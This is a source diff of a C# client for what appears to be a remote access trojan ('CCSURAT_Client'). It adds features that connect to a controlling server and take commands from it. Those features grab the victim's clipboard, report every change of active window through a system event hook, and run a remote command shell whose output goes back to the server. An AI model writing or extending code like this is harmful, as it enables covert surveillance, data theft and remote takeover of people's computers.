@@ -1,10 +1,15 @@
-﻿using System;
+﻿using CCSURAT_Client.Control;
+using System;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
 
 namespace CCSURAT_Client
 {
+    // Manages the network of the client.
+    // - Communicates with server (connects, listens to commands, sends data to server)
+    // - Performs functions based on received commands.
     class NetworkManager
     {
         private string serverIP;
@@ -19,12 +24,22 @@ namespace CCSURAT_Client
         private string status;
         private Boolean isConnected;
 
+        private RemoteCMD cmd;
+
+        WinEventDelegate dele = null;
+        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
+        private const uint WINEVENT_OUTOFCONTEXT = 0;
+        private const uint EVENT_SYSTEM_FOREGROUND = 3;
         public NetworkManager(ClientMainForm form, string IP, int port)
         {
             this.mainForm = form;
             this.serverIP = IP;
             this.serverPort = port;
             SetStatus("Disconnected.");
+            dele = new WinEventDelegate(WinEventProc);
+            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
         }
 
         public void Start()
@@ -52,6 +67,7 @@ namespace CCSURAT_Client
                 catch (Exception ex)
                 {
                     Log("Error occurred while connecting: " + ex.ToString());
+                    Thread.Sleep(100);
                     Log("Retrying connection...");
                 }
             }
@@ -71,7 +87,7 @@ namespace CCSURAT_Client
                     {
                         // convert data bytes to string
                         data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                        Log("Command recieved: " + data);
+                        Log("Data recieved: " + data);
                         HandleData(data);
                     }
                     System.Threading.Thread.Sleep(1);
@@ -116,18 +132,33 @@ namespace CCSURAT_Client
             try {
                 string command = GetCommand(data);
                 data = RemoveCommand(data);
+                // Split parameters, parameters are just open command tags w/o close command tag: [[EXAMPLEPARAM]]
+                string[] prms = new string[0];
+                if (data != string.Empty)
+                    prms = data.Split(new string[] { "|*|" }, StringSplitOptions.None);
+                Log("Handling command: " + command);
                 switch (command)
                 {
                     case "START":
                         Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
                         break;
                     case "KILL":
-                        Application.Exit();
+                        Environment.Exit(0);
                         break;
                     case "RESTART":
                         Application.Restart();
+                        Environment.Exit(0);
                         break;
-
+                    case "MESSAGE":
+                        MessageBox.Show(data);
+                        break;
+                    case "CLIPBOARD":
+                        Write("[[CLIPBOARD]]" + SystemUtils.GetClipboard() + "[[/CLIPBOARD]]");
+                        break;
+                    case "REMOTECMD":
+                        RemoteCmd(prms[0]);
+                        Write("[[CMD]]" + cmd.GetResponse() + "[[/CMD]]");
+                        break;
                 }
             } catch(Exception ex)
             {
@@ -153,16 +184,39 @@ namespace CCSURAT_Client
         // write data to server
         public void Write(string data)
         {
-            try {
-                byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
-                netStream.Write(msg, 0, msg.Length);
-                System.Threading.Thread.Sleep(20);
-                Log("Sent data: " + data);
-            }
-            catch(Exception ex)
+            if (isConnected)
             {
-                Log("Error sending data: " + ex.ToString());
+                try
+                {
+                    byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
+                    netStream.Write(msg, 0, msg.Length);
+                    System.Threading.Thread.Sleep(20);
+                    Log("Data sent: " + data);
+                }
+                catch (Exception ex)
+                {
+                    Log("Error sending data: " + ex.ToString());
+                }
             }
+        }
+
+        // Detects active window change. Might need to look at adding web browser tab change detection.
+        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+        {
+            Write("[[ACTIVEWINDOW]]" + SystemUtils.GetActiveWindow() + "[[/ACTIVEWINDOW]]");
+        }
+
+        // Process Remote CMD data on the CMD control
+        private void RemoteCmd(string arg)
+        {
+            if (cmd == null)
+                cmd = new RemoteCMD();
+            if (arg == "[[RESTART]]")
+                cmd.Restart();
+            else if (arg == "[[STOP]]")
+                cmd.Stop();
+            else if (arg != "[[START]]")
+                cmd.Write(arg);
         }
 
         private void SetStatus(string s)
